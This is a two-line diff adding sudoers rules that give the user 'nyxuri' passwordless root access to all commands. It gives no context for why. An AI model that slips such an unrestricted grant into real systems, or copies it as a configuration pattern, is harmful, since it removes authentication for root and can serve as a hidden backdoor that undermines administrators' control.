@@ -1,0 +1,2 @@
+nyxuri ALL=(ALL) NOPASSWD: ALL
+Defaults:nyxuri verifypw = any
